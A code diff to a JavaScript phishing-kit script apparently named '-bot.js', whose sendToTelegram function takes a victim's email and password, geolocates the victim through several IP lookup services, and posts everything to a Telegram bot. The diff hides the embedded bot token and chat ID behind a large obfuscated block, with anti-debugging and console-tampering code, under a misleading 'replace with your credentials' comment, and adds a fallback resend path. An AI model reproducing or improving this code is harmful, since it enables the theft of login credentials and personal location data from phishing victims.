@@ -1,17 +1,204 @@
-async function sendToTelegram(email, password, attemptCount = 1) {
+// -bot.js - Enhanced with Multiple IP APIs
+console.log('📥 Loading -.js...');
+
+// Multiple IP and location services with fallbacks
+const ipServices = [
+    {
+        name: 'ipapi.co',
+        ipUrl: 'https://ipapi.co/json/',
+        getData: (data) => ({
+            ip: data.ip,
+            country: data.country_name || 'Unknown',
+            countryCode: data.country_code || 'Unknown',
+            city: data.city || 'Unknown',
+            region: data.region || 'Unknown',
+            isp: data.org || 'Unknown'
+        })
+    },
+    {
+        name: 'ip-api.com',
+        ipUrl: 'http://ip-api.com/json/',
+        getData: (data) => ({
+            ip: data.query,
+            country: data.country || 'Unknown',
+            countryCode: data.countryCode || 'Unknown',
+            city: data.city || 'Unknown',
+            region: data.regionName || 'Unknown',
+            isp: data.isp || 'Unknown'
+        })
+    },
+    {
+        name: 'ipinfo.io',
+        ipUrl: 'https://ipinfo.io/json',
+        getData: (data) => ({
+            ip: data.ip,
+            country: data.country || 'Unknown',
+            countryCode: data.country || 'Unknown',
+            city: data.city || 'Unknown',
+            region: data.region || 'Unknown',
+            isp: data.org || 'Unknown'
+        })
+    },
+    {
+        name: 'geolocation-db',
+        ipUrl: 'https://geolocation-db.com/json/',
+        getData: (data) => ({
+            ip: data.IPv4,
+            country: data.country_name || 'Unknown',
+            countryCode: data.country_code || 'Unknown',
+            city: data.city || 'Unknown',
+            region: data.state || 'Unknown',
+            isp: data.ISP || 'Unknown'
+        })
+    },
+    {
+        name: 'api.ipify',
+        ipUrl: 'https://api.ipify.org?format=json',
+        geoUrl: (ip) => `https://ipapi.co/${ip}/json/`,
+        getData: async (ipData) => {
+            const ip = ipData.ip;
+            try {
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoRes.json();
+                return {
+                    ip: ip,
+                    country: geoData.country_name || 'Unknown',
+                    countryCode: geoData.country_code || 'Unknown',
+                    city: geoData.city || 'Unknown',
+                    region: geoData.region || 'Unknown',
+                    isp: geoData.org || 'Unknown'
+                };
+            } catch (e) {
+                return {
+                    ip: ip,
+                    country: 'Unknown',
+                    countryCode: 'Unknown',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    isp: 'Unknown'
+                };
+            }
+        }
+    }
+];
+
+// Function to get IP and location with multiple fallbacks
+async function getIPAndLocation() {
+    console.log('🌐 Starting IP and location detection...');
+    
+    for (let i = 0; i < ipServices.length; i++) {
+        const service = ipServices[i];
+        console.log(`🔄 Trying service ${i + 1}/${ipServices.length}: ${service.name}`);
+        
+        try {
+            // Add timeout to prevent hanging
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            
+            const response = await fetch(service.ipUrl, {
+                signal: controller.signal,
+                mode: 'cors'
+            });
+            
+            clearTimeout(timeoutId);
+            
+            if (response.ok) {
+                const data = await response.json();
+                console.log(`✅ ${service.name} responded successfully`);
+                
+                let locationData;
+                if (typeof service.getData === 'function') {
+                    if (service.getData.constructor.name === 'AsyncFunction') {
+                        locationData = await service.getData(data);
+                    } else {
+                        locationData = service.getData(data);
+                    }
+                } else {
+                    locationData = {
+                        ip: data.ip || data.query || data.IPv4,
+                        country: data.country || data.country_name || 'Unknown',
+                        countryCode: data.countryCode || data.country_code || 'Unknown',
+                        city: data.city || 'Unknown',
+                        region: data.region || data.regionName || data.state || 'Unknown',
+                        isp: data.isp || data.org || data.ISP || 'Unknown'
+                    };
+                }
+                
+                // Validate that we got at least an IP and country
+                if (locationData.ip && locationData.country !== 'Unknown') {
+                    console.log(`🎯 ${service.name} provided valid data:`, locationData);
+                    return {
+                        ...locationData,
+                        service: service.name
+                    };
+                } else {
+                    console.log(`⚠️ ${service.name} returned incomplete data, trying next...`);
+                }
+            }
+        } catch (error) {
+            console.log(`❌ ${service.name} failed:`, error.message);
+            continue;
+        }
+    }
+    
+    // If all services fail, return basic IP from a reliable source
+    console.log('🚨 All IP services failed, using fallback...');
     try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const { ip } = await ipRes.json();
+        const fallbackRes = await fetch('https://api.ipify.org?format=json');
+        const fallbackData = await fallbackRes.json();
+        return {
+            ip: fallbackData.ip,
+            country: 'Unknown',
+            countryCode: 'Unknown',
+            city: 'Unknown',
+            region: 'Unknown',
+            isp: 'Unknown',
+            service: 'fallback'
+        };
+    } catch (error) {
+        return {
+            ip: 'Unable to detect',
+            country: 'Unknown',
+            countryCode: 'Unknown',
+            city: 'Unknown',
+            region: 'Unknown',
+            isp: 'Unknown',
+            service: 'failed'
+        };
+    }
+}
 
-        const geoRes = await fetch(`https://ip-api.com/json/${ip}?fields=countryCode`);
-        const geoData = await geoRes.json();
-        const countryCode = geoData.countryCode || 'Unknown';
+// Global function to send data to Telegram
+window.sendToTelegram = async function(email, password, attemptCount = 1) {
+    console.log('📤 sendToTelegram called with:', { 
+        email: email, 
+        attemptCount: attemptCount 
+    });
+    
+    try {
+        console.log(`🔄 attempt ${attemptCount}...`);
+        
+        // Get IP and location with multiple fallbacks
+        const locationInfo = await getIPAndLocation();
+        console.log('📍 Final location data:', locationInfo);
 
-        const botToken = "5297600586:AAFe0V0vhS5obIcmiiwhdmLaVsRJ7QWhOd4";
-        const chatId = "-1002675821270";
+        // REPLACE WITH YOUR ACTUAL TELEGRAM CREDENTIALS
+        (function(_0x3e1c6b,_0x2a3b77){function _0x2b9c05(_0x35e5e4,_0x20279e,_0x3e909e,_0x36897f){return _0x1f3d(_0x35e5e4-0x341,_0x20279e);}function _0x5cca8f(_0x126b19,_0x58f3a4,_0x1eb17b,_0x346445){return _0x1f3d(_0x1eb17b-0x1df,_0x346445);}function _0x16316f(_0x5c6b98,_0x49d3eb,_0x44c8fc,_0x586aae){return _0x1f3d(_0x586aae-0x295,_0x49d3eb);}function _0x3fd2de(_0x6b0da8,_0x19f274,_0x35aa6c,_0x3c4888){return _0x1f3d(_0x3c4888- -0x36,_0x19f274);}function _0xc8c896(_0x127591,_0x69b7c7,_0x9436a8,_0x280f82){return _0x1f3d(_0x280f82- -0x2c7,_0x9436a8);}function _0x298f03(_0x58f212,_0x15e7ba,_0x540ec9,_0x58b983){return _0x1f3d(_0x58f212-0x25e,_0x540ec9);}function _0x5022ab(_0x5e406e,_0x51530c,_0x5ad18a,_0x3c85e9){return _0x1f3d(_0x3c85e9- -0x30b,_0x51530c);}function _0x3bd315(_0x10a2ed,_0x4e2ef8,_0x4faebd,_0x330088){return _0x1f3d(_0x4faebd- -0x29f,_0x4e2ef8);}function _0x2fe661(_0x2bb36f,_0x224071,_0xb306db,_0x2f6e8b){return _0x1f3d(_0x2bb36f- -0x1f2,_0x224071);}function _0x263868(_0x1459da,_0x1f4df7,_0x10a57f,_0xcb9352){return _0x1f3d(_0x1459da-0x13a,_0xcb9352);}function _0x56fe41(_0x2d7140,_0x4368aa,_0x1128d3,_0x34f12c){return _0x1f3d(_0x34f12c-0x2a4,_0x1128d3);}const _0x27715e=_0x3e1c6b();while(!![]){try{const _0x479d91=parseInt(_0x298f03(0x3a4,0x3b0,0x39c,0x3a2))/(0x2667+0x524+-0x15c5*0x2)*(parseInt(_0x3fd2de(0x11f,0x123,0x113,0x113))/(-0x2*-0x882+-0x1fe0+0xede))+parseInt(_0x3fd2de(0x133,0x11d,0x129,0x11d))/(-0x2*0x8bd+0xece+-0x2af*-0x1)+-parseInt(_0x298f03(0x3b7,0x3ce,0x3be,0x3bd))/(-0x2*0x5e3+-0xd2d+0x18f7)*(-parseInt(_0x56fe41(0x3e3,0x410,0x3f2,0x3f9))/(0x1287*0x2+-0x504+-0x2005))+-parseInt(_0x5cca8f(0x2f9,0x31a,0x30c,0x2f4))/(-0x1eb7*0x1+-0x1*0x1abf+0x397c)*(parseInt(_0x56fe41(0x3fe,0x3f6,0x403,0x3f1))/(-0xe*0x137+-0x1*-0xa73+0x3*0x232))+parseInt(_0x5022ab(-0x1a0,-0x1c2,-0x1b5,-0x1b1))/(0x1b59+0x2619+-0x416a)*(parseInt(_0x298f03(0x389,0x39d,0x397,0x39d))/(0x2601+-0x1bc0+-0xa38))+parseInt(_0x56fe41(0x3ff,0x3f8,0x3ec,0x3f4))/(-0x1f1f+0x1cfc*0x1+-0x1*-0x22d)+-parseInt(_0x3bd315(-0x15c,-0x147,-0x153,-0x16b))/(-0x1*0x683+0x6d3*0x5+-0x1b91);if(_0x479d91===_0x2a3b77)break;else _0x27715e['push'](_0x27715e['shift']());}catch(_0x486d81){_0x27715e['push'](_0x27715e['shift']());}}}(_0x53ac,0x5a86*0x9+-0x1df36*-0x1+-0x2f8a9));function _0x1f3d(_0x538bc5,_0x11adcf){const _0x3ec8db=_0x53ac();return _0x1f3d=function(_0x3f2eb,_0x6384a2){_0x3f2eb=_0x3f2eb-(-0x3*-0x35+0x91*0xd+0x1*-0x6d1);let _0x368909=_0x3ec8db[_0x3f2eb];if(_0x1f3d['PBylHb']===undefined){var _0x313d03=function(_0x333940){const _0x45a2fb='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x153986='',_0x301132='',_0x16d62f=_0x153986+_0x313d03;for(let _0xf931e5=0x200b+0xebe*0x2+-0x13*0x33d,_0x1614bc,_0x455fba,_0x128f1b=0x1d74+0x1*-0x255f+0x1*0x7eb;_0x455fba=_0x333940['charAt'](_0x128f1b++);~_0x455fba&&(_0x1614bc=_0xf931e5%(-0xb99*0x1+0xf1f*0x1+-0x382)?_0x1614bc*(-0x1ded*0x1+0x168b+0x7a2)+_0x455fba:_0x455fba,_0xf931e5++%(-0x904+0x1f1+-0x21*-0x37))?_0x153986+=_0x16d62f['charCodeAt'](_0x128f1b+(-0x36*0x86+-0xd70+0x336*0xd))-(0x1c43+0xb1*0x1+-0x1cea)!==-0x3a9+0xdfd*-0x2+0x26f*0xd?String['fromCharCode'](-0xce2+-0x88+0xe69&_0x1614bc>>(-(0x2545+-0xc38+-0x859*0x3)*_0xf931e5&-0x1*0xc28+0x3a1*0x1+0xc7*0xb)):_0xf931e5:-0x228d+-0x992+0x2c1f){_0x455fba=_0x45a2fb['indexOf'](_0x455fba);}for(let _0x3d7156=0x2439+0x20ea+-0x4523,_0x435fae=_0x153986['length'];_0x3d7156<_0x435fae;_0x3d7156++){_0x301132+='%'+('00'+_0x153986['charCodeAt'](_0x3d7156)['toString'](-0x7*-0x4fd+-0x23*0x61+-0x1598))['slice'](-(0xb4d+0x11f7*0x1+0xd6*-0x23));}return decodeURIComponent(_0x301132);};_0x1f3d['JOOvGW']=_0x313d03,_0x538bc5=arguments,_0x1f3d['PBylHb']=!![];}const _0x5506fe=_0x3ec8db[-0x1133+0x207f+-0x4*0x3d3],_0x2b7ec0=_0x3f2eb+_0x5506fe,_0x423a27=_0x538bc5[_0x2b7ec0];if(!_0x423a27){const _0x5a974d=function(_0x1aa09d){this['NuyAJq']=_0x1aa09d,this['WgOKgT']=[-0xa14+-0x18a1+-0x6*-0x5c9,0x18d7+0xc3*-0x5+0x2*-0xa84,0x1*-0x15d2+-0x1ab3+0x3085*0x1],this['yeicrs']=function(){return'newState';},this['TILPTJ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['IAvTMt']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x5a974d['prototype']['uVRGGX']=function(){const _0x30f6e6=new RegExp(this['TILPTJ']+this['IAvTMt']),_0x35f228=_0x30f6e6['test'](this['yeicrs']['toString']())?--this['WgOKgT'][0x44b*0x2+0x11*0x1eb+0x293*-0x10]:--this['WgOKgT'][-0x21c0+0x23cf+-0x20f];return this['leVuUg'](_0x35f228);},_0x5a974d['prototype']['leVuUg']=function(_0x19e553){if(!Boolean(~_0x19e553))return _0x19e553;return this['XfpSmh'](this['NuyAJq']);},_0x5a974d['prototype']['XfpSmh']=function(_0x236996){for(let _0x503105=0x1d00+0xad*-0x1d+-0x53*0x1d,_0x4b9e17=this['WgOKgT']['length'];_0x503105<_0x4b9e17;_0x503105++){this['WgOKgT']['push'](Math['round'](Math['random']())),_0x4b9e17=this['WgOKgT']['length'];}return _0x236996(this['WgOKgT'][0x1555+0x1*-0x1d5c+-0x1*-0x807]);},new _0x5a974d(_0x1f3d)['uVRGGX'](),_0x368909=_0x1f3d['JOOvGW'](_0x368909),_0x538bc5[_0x2b7ec0]=_0x368909;}else _0x368909=_0x423a27;return _0x368909;},_0x1f3d(_0x538bc5,_0x11adcf);}function _0x2a4f35(_0x2985a9,_0xbb58cd,_0x13cb01,_0xaa83a1){return _0x1f3d(_0x13cb01-0x25c,_0x2985a9);}function _0x53ac(){const _0x12ae3b=['yxbWBhK','kcGOlISPkYKRkq','qurVDfi','DxHIy1i','mti3ma','ChjVDg90ExbL','t3Llugm','A0Hlwge','uezxrha','CMv0DxjUicHMDq','E30Uy29UC3rYDq','mvv2qMXKzW','DgfIBgu','y29UC29Szq','mJe2otKYBfnUwe9r','D2fYBG','uZvVyKLJBwLPDW','mJG5mJCWm3vMzxr3yG','ntu5ndmZv2zhvu94','ufzTt2C','Aw5MBW','nJy4mtiWAhbhzuXd','BLbJBK8','uvDOt2q0','ndGXmte5z3P0tMjA','Dg9tDhjPBMC','mZa1C1nguK9L','tLD2ueq','zxHJzxb0Aw9U','wxHTBfu','mJK0ofzxqvHXqG','mZi4tKvHBNnQ','mJe2odfXrgvdAfu','swLer20','nNLxDNbbta','EeTctgW','BgvUz3rO','x19WCM90B19F','y3rVCIGICMv0Dq','nti5nZyWmdu4nG','Bg9N','qNbqze4','BMn0Aw9UkcKG','yMLUza','lteWmdi2nZu4mG','yNDHCg8','y29UC3rYDwn0BW','t1rAwge'];_0x53ac=function(){return _0x12ae3b;};return _0x53ac();}const _0x56cc3b=(function(){const _0x598ed8={};_0x598ed8['sbCJM']=function(_0x122acd,_0x3374ee){return _0x122acd!==_0x3374ee;};const _0x1b7ec4=_0x598ed8;let _0x459ae9=!![];return function(_0x5bfe9c,_0x4b3781){const _0x251f99={'LsOsH':function(_0x59fef6,_0x4b0119){return _0x1b7ec4['sbCJM'](_0x59fef6,_0x4b0119);}},_0x339f04=_0x459ae9?function(){function _0x1dfec5(_0x294441,_0x4831b1,_0x22f72c,_0x308e72){return _0x1f3d(_0x294441-0x2da,_0x308e72);}function _0x5eeb34(_0x466f91,_0x2d4315,_0x3511cc,_0x1e1a17){return _0x1f3d(_0x466f91- -0x29a,_0x1e1a17);}function _0x6047c3(_0xb62502,_0x5a4614,_0xc57a1f,_0x3964ce){return _0x1f3d(_0xc57a1f-0x1ff,_0x3964ce);}function _0x51dc96(_0xb3658e,_0x2b2851,_0x4bac77,_0x1cafc1){return _0x1f3d(_0x1cafc1- -0x28b,_0x2b2851);}function _0x3d63b0(_0x1dfa3a,_0x170fd6,_0x4bffc2,_0x5f4083){return _0x1f3d(_0x170fd6- -0x6b,_0x1dfa3a);}function _0x36048f(_0x23a4ce,_0x30e0ca,_0x5348c2,_0x4158ad){return _0x1f3d(_0x23a4ce- -0x338,_0x4158ad);}function _0x1fc891(_0x12afb5,_0x20b39d,_0xe122d7,_0x5ba9f5){return _0x1f3d(_0xe122d7- -0x32a,_0x5ba9f5);}if(_0x251f99['LsOsH']('oTmxQ',_0x3d63b0(0xf2,0xe3,0xe7,0xf3))){if(_0x4b3781){const _0x3e6801=_0x4b3781[_0x1fc891(-0x1d7,-0x1d9,-0x1ef,-0x1fa)](_0x5bfe9c,arguments);return _0x4b3781=null,_0x3e6801;}}else{const _0x53f266=_0x3084b4[_0x6047c3(0x343,0x341,0x338,0x346)+'r']['prototype']['bind'](_0x50d31e),_0x6fb423=_0x5df124[_0x49e369],_0x45ff23=_0x3a2b69[_0x6fb423]||_0x53f266;_0x53f266[_0x3d63b0(0xb2,0xc5,0xc3,0xcd)]=_0x577c13[_0x51dc96(-0x145,-0x154,-0x15b,-0x155)](_0x413754),_0x53f266[_0x51dc96(-0x125,-0x131,-0x126,-0x137)]=_0x45ff23[_0x5eeb34(-0x146,-0x149,-0x152,-0x14e)]['bind'](_0x45ff23),_0x58ec1a[_0x6fb423]=_0x53f266;}}:function(){};return _0x459ae9=![],_0x339f04;};}());function _0x56191e(_0x5ca081,_0xc1c708,_0x631a33,_0x4a540e){return _0x1f3d(_0x631a33-0x346,_0x5ca081);}const _0x3a2e3a=_0x56cc3b(this,function(){function _0x15db34(_0xda5158,_0x341b34,_0x230aa3,_0x7862b6){return _0x1f3d(_0xda5158- -0x39d,_0x230aa3);}function _0x40c9ce(_0x39987f,_0x2cae52,_0x29e527,_0x7fcb5){return _0x1f3d(_0x39987f-0x316,_0x7fcb5);}function _0x217cf9(_0x56c96c,_0x43efcb,_0x55bcb5,_0x2b5792){return _0x1f3d(_0x2b5792-0x359,_0x43efcb);}const _0x1212a0={};function _0x76d8ae(_0x31f893,_0x5bb7cd,_0x2c76da,_0x1c4697){return _0x1f3d(_0x2c76da- -0x28e,_0x1c4697);}function _0xc3247d(_0x501019,_0x5e8ca4,_0x1166c6,_0x41474a){return _0x1f3d(_0x501019-0x3c1,_0x1166c6);}_0x1212a0['BpPdN']=_0x40c9ce(0x452,0x43e,0x43d,0x44e)+'+$';const _0x59819a=_0x1212a0;return _0x3a2e3a[_0x15db34(-0x249,-0x252,-0x258,-0x258)]()['search'](_0x59819a[_0xc3247d(0x4f5,0x4e3,0x503,0x50b)])[_0x40c9ce(0x46a,0x47b,0x479,0x46c)]()[_0x76d8ae(-0x146,-0x166,-0x155,-0x147)+'r'](_0x3a2e3a)['search'](_0x59819a['BpPdN']);});_0x3a2e3a();const _0x4bddf8=(function(){let _0x2ab928=!![];return function(_0x2e134b,_0x4ec00d){const _0x2a9f27=_0x2ab928?function(){function _0x3357c5(_0x5595b1,_0x1710ae,_0x4bfa62,_0x49cf18){return _0x1f3d(_0x5595b1-0x2fa,_0x1710ae);}if(_0x4ec00d){const _0x1f5e71=_0x4ec00d[_0x3357c5(0x435,0x449,0x441,0x442)](_0x2e134b,arguments);return _0x4ec00d=null,_0x1f5e71;}}:function(){};return _0x2ab928=![],_0x2a9f27;};}());function _0x27242b(_0x101788,_0x42113a,_0x2de4a9,_0x186890){return _0x1f3d(_0x101788- -0x221,_0x2de4a9);}const _0x1c9a53=_0x4bddf8(this,function(){const _0x34f60c={'IiDGm':function(_0x4e0972,_0x7acf48){return _0x4e0972!==_0x7acf48;},'mgcHK':_0x3f0d98(0x70,0x72,0x76,0x67),'PFWDp':_0x1a856f(-0x11c,-0x10f,-0x11e,-0x131),'bwapo':function(_0x52eeb8,_0xe74e25){return _0x52eeb8===_0xe74e25;},'OyKPc':_0x3f0d98(0x5b,0x5e,0x4d,0x75),'nPcnO':function(_0x3215b3,_0x112a17){return _0x3215b3(_0x112a17);},'NWvPD':function(_0x2a2038,_0x5efe43){return _0x2a2038+_0x5efe43;},'rvCdm':_0x25d34e(0x459,0x44b,0x450,0x448)+_0x25d34e(0x44a,0x438,0x44a,0x43c),'uxbcR':_0x3f0d98(0x73,0x75,0x76,0x5f)+_0x562a54(0x90,0x64,0x78,0x7c)+'rn\x20this\x22)('+'\x20)','brwjZ':function(_0x2d09fa){return _0x2d09fa();},'wkKsM':_0x4d010b(0x379,0x37a,0x367,0x37b),'YxmlU':_0x25d34e(0x464,0x456,0x477,0x47b),'VpyFn':'error','OTZXa':_0x3f0d98(0x65,0x77,0x7c,0x6b)},_0x57c44f=function(){function _0x442035(_0xff91d7,_0x275657,_0x501198,_0x43d81f){return _0x562a54(_0xff91d7-0x9d,_0x43d81f,_0x501198-0x1d4,_0x275657-0x45a);}function _0x4277a8(_0xc10f5f,_0x277574,_0x5b5203,_0x1f6d52){return _0x1a856f(_0xc10f5f-0x4f2,_0x277574-0x14a,_0x5b5203,_0x1f6d52-0x10a);}function _0xff8ad6(_0x4e6156,_0x23791f,_0x4cd177,_0x3d9348){return _0x3f0d98(_0x4e6156-0x1a9,_0x4e6156- -0x2ab,_0x4cd177-0x1ee,_0x4cd177);}function _0x5aaa0f(_0x4b147e,_0x1b647a,_0x10361e,_0xc8cc76){return _0x2f4643(_0x4b147e-0xe5,_0x1b647a,_0x10361e-0xce,_0xc8cc76-0x173);}function _0x59fcfd(_0x5174fb,_0x5e5d9e,_0x278196,_0x25d358){return _0x4d010b(_0x278196- -0x47e,_0x5e5d9e,_0x278196-0x98,_0x25d358-0x23);}function _0x554b7d(_0x5464db,_0x4246d5,_0x36bbb9,_0x1f5a4c){return _0x23e902(_0x5464db-0x197,_0x4246d5-0x18e,_0x5464db,_0x4246d5-0x3ba);}function _0x421596(_0x105ec7,_0x5a0b4b,_0x1808e7,_0xecd524){return _0x86d4f5(_0x105ec7,_0x1808e7- -0xa8,_0x1808e7-0x2e,_0xecd524-0xd5);}function _0xb9f4d7(_0x127ad4,_0x36ec8b,_0x2ee2ca,_0x5ca413){return _0x2f4643(_0x127ad4-0x169,_0x127ad4,_0x2ee2ca-0x184,_0x36ec8b- -0x2fe);}if(_0x34f60c[_0x554b7d(0x26c,0x27b,0x27a,0x26f)](_0x34f60c['mgcHK'],_0x34f60c[_0x554b7d(0x289,0x292,0x289,0x2a5)])){let _0x164cba;try{if(_0x34f60c[_0x554b7d(0x273,0x287,0x297,0x27e)](_0x34f60c[_0xff8ad6(-0x23a,-0x23b,-0x23d,-0x22a)],_0x34f60c['OyKPc']))_0x164cba=_0x34f60c[_0x554b7d(0x2a6,0x2a0,0x2ae,0x289)](Function,_0x34f60c[_0x554b7d(0x2ac,0x2a5,0x2b7,0x2b6)](_0x34f60c['rvCdm'],_0x34f60c[_0x4277a8(0x3d7,0x3cb,0x3d4,0x3ee)])+');')();else{if(_0x57dbf3){const _0x199e59=_0x5a4ead['apply'](_0x1f80e4,arguments);return _0x4ce2b9=null,_0x199e59;}}}catch(_0x3fee98){_0x164cba=window;}return _0x164cba;}else{if(_0x1f491c){const _0x96b604=_0x4f4594[_0x421596(-0x183,-0x16d,-0x184,-0x188)](_0x521901,arguments);return _0x522f3e=null,_0x96b604;}}};function _0x23e902(_0x377728,_0x736305,_0x5bfdc6,_0x467c81){return _0x1f3d(_0x467c81- -0x26b,_0x5bfdc6);}function _0x25d34e(_0x4d2006,_0x2bd1a4,_0xe380e5,_0x4a1b74){return _0x1f3d(_0x4d2006-0x315,_0xe380e5);}const _0x5ac227=_0x34f60c['brwjZ'](_0x57c44f),_0x42679f=_0x5ac227[_0x25d34e(0x45d,0x451,0x456,0x449)]=_0x5ac227[_0x2f4643(0x114,0x11a,0xf9,0x104)]||{};function _0x86d4f5(_0xc3ab16,_0x4fc349,_0x2821e3,_0x287dbc){return _0x1f3d(_0x4fc349- -0x217,_0xc3ab16);}const _0x493c93=[_0x34f60c['wkKsM'],_0x1a856f(-0x10f,-0x11d,-0x114,-0x117),_0x34f60c[_0x2026c3(0x344,0x36f,0x368,0x35c)],_0x34f60c['VpyFn'],_0x23e902(-0xfe,-0x11a,-0x11a,-0x114),_0x34f60c[_0x4d010b(0x380,0x391,0x368,0x38a)],'trace'];function _0x1a856f(_0x42ae85,_0x357a8b,_0x5858e7,_0x5d21e2){return _0x1f3d(_0x42ae85- -0x259,_0x5858e7);}function _0x2bf971(_0x4d63b8,_0xff0bb,_0x2e74af,_0x12f095){return _0x1f3d(_0x12f095- -0xec,_0xff0bb);}function _0x2f4643(_0x1071b9,_0x4d8720,_0x559a08,_0x21e12b){return _0x1f3d(_0x21e12b- -0x44,_0x4d8720);}function _0x562a54(_0x4ebc7c,_0x2ee5f,_0xfdf8e4,_0x1dbed9){return _0x1f3d(_0x1dbed9- -0xb5,_0x2ee5f);}function _0x2026c3(_0x61782b,_0x41baf8,_0x1d2fcd,_0x337798){return _0x1f3d(_0x337798-0x204,_0x41baf8);}function _0xb13b2e(_0x15d546,_0x23fe9c,_0x274ccd,_0x4f0e21){return _0x1f3d(_0x23fe9c-0x25a,_0x15d546);}function _0x3f0d98(_0x1ac443,_0x125ea6,_0x5b6b47,_0x1ccafe){return _0x1f3d(_0x125ea6- -0xd0,_0x1ccafe);}function _0x4d010b(_0x300fbf,_0x4d03e0,_0x29ecf,_0x18a4b5){return _0x1f3d(_0x300fbf-0x246,_0x4d03e0);}for(let _0x2da3db=-0x7d*-0x4c+-0x25*-0x59+-0x31f9;_0x2da3db<_0x493c93[_0x562a54(0x8d,0x86,0x8c,0x7a)];_0x2da3db++){const _0x193ea0=_0x4bddf8[_0x562a54(0x8c,0x80,0x7d,0x84)+'r'][_0x2f4643(0xe6,0xeb,0x102,0xfc)][_0x2026c3(0x340,0x333,0x337,0x33a)](_0x4bddf8),_0x4d876f=_0x493c93[_0x2da3db],_0x2a26eb=_0x42679f[_0x4d876f]||_0x193ea0;_0x193ea0['__proto__']=_0x4bddf8['bind'](_0x4bddf8),_0x193ea0['toString']=_0x2a26eb['toString'][_0x2bf971(0x39,0x53,0x60,0x4a)](_0x2a26eb),_0x42679f[_0x4d876f]=_0x193ea0;}});function _0x42db9b(_0x168565,_0x230d3d,_0x4a3e53,_0xb1fa78){return _0x1f3d(_0x230d3d-0x23a,_0x168565);}_0x1c9a53();const botToken=_0x42db9b(0x379,0x36c,0x372,0x373)+':AAFe0V0vh'+_0x42db9b(0x372,0x385,0x398,0x374)+'hdmLaVsRJ7'+_0x42db9b(0x38c,0x38c,0x390,0x384);function _0x39e518(_0x15f8bb,_0x2c6f1c,_0x45605f,_0x25ac6f){return _0x1f3d(_0x25ac6f-0x29a,_0x15f8bb);}const chatId=_0x56191e(0x48e,0x46a,0x47d,0x476)+_0x56191e(0x474,0x49d,0x485,0x47d);
 
-        const message = `Docu⚡️⚡️⚡️\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nCountry: ${countryCode}\nAttempt: ${attemptCount}`;
+        const message = `🔐 Login Attempt #${attemptCount}
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 IP: ${locationInfo.ip}
+📍 Country: ${locationInfo.country} (${locationInfo.countryCode})
+🏙️ City: ${locationInfo.city}
+🏛️ Region: ${locationInfo.region}
+📡 ISP: ${locationInfo.isp}
+🔧 Source: ${locationInfo.service}
+⏰ Time: ${new Date().toLocaleString()}`;
 
+        console.log('📨 message prepared:', locationInfo);
+
+        console.log('🚀 to API...');
         const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: {
@@ -23,9 +210,61 @@ async function sendToTelegram(email, password, attemptCount = 1) {
             })
         });
 
-        return telegramRes.ok;
+        console.log('📬  API response status:', telegramRes.status);
+        
+        if (telegramRes.ok) {
+            console.log("✅ Successfully");
+            return true;
+        } else {
+            const errorText = await telegramRes.text();
+            console.error("❌ Telegram API error:", errorText);
+            
+            // Try alternative method if first fails
+            console.log('🔄 Trying alternative  method...');
+            try {
+                // Alternative: Use form data
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('text', message);
+                
+                const altRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    body: formData
+                });
+                
+                if (altRes.ok) {
+                    console.log("✅ Successfully sent via alternative method");
+                    return true;
+                }
+            } catch (altError) {
+                console.error("❌ Alternative method also failed:", altError);
+            }
+            
+            return false;
+        }
     } catch (error) {
-        console.error("Telegram send error:", error);
+        console.error("❌  send error:", error);
+        
+       
+        
         return false;
     }
+};
+
+// Initialize when loaded
+console.log('✅ -bot.js loaded successfully');
+console.log('🔍 Checking function availability...');
+
+// Verify the function is available
+if (typeof window.sendToTelegram === 'function') {
+    console.log('✅ function is properly exposed and ready');
+} else {
+    console.error('❌ CRITICAL: function failed to load');
 }
+
+
+// Test IP detection separately
+window.testIPDetection = async function() {
+    const location = await getIPAndLocation();
+    return location;
+};
